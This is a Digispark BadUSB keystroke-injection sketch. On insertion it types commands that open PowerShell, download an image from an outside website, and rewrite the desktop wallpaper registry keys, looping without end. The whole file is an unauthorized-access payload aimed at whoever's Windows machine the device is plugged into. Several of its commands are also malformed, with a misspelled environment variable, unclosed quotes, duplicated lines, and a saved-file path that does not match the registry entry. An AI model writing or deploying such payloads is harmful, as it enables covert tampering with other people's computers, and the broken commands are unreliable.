#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$client = new-object System.Net.WebClient");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("$client.DownloadFile(\"https://www.oficinadanet.com.br/imagens/post/14980/750xNxcapawin10.jpg.pagespeed.ic.36d7571352.jpg\" , \"w10.jpg\")");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"\" /f");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"%USERPROFILES\\w10.jpg /f");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"%USERPROFILES\\w10.jpg /f");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaper /t REG_SZ /d \"%USERPROFILES\\w10.jpg /f");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("reg add \"HKEY_CURRENT_USER\\control panel\\desktop\" /v wallpaperStyle /t REG_SZ /d 2 /f");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println ("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");

  
}
  
